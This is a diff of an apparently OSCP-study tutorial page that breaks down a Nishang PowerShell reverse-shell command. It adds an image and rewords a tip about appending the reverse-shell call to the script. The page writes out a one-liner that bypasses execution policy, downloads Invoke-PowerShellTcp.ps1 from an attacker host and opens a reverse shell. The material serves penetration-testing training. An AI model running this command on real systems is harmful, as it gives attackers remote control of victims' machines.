@@ -87,7 +87,9 @@ Let's see the breakdown:
 3. `-c` or `-Command` : This is used to specify a command to be executed.
 	- `"iex ((New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1'))` : This part of the command downloads the `Invoke-PowerShellTcp.ps1` file.
 	- `Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>"` : These are the arguments passed to `Invoke-PowerShellTcp.ps1` module. More arguments or examples can be seen on Nishang's github.
-	- Pro tip: you can append the `Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <port>` to your `Invoke-PowerShellTcp.ps1`. This way, your final command for reverse shell would just be downloading and invoking the module, you don't have to pass the arguments anymore:
+	- Pro tip: you can append the `Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <port>` to your `Invoke-PowerShellTcp.ps1`. Example:
+		![image-center](/assets/images/oscp/1/Invoke-ps1.png)
+	This way, your final command for reverse shell would just be downloading and invoking the module, you don't have to pass the arguments anymore. Final command:   
 	`powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1'))`
 {: .text-justify}
 
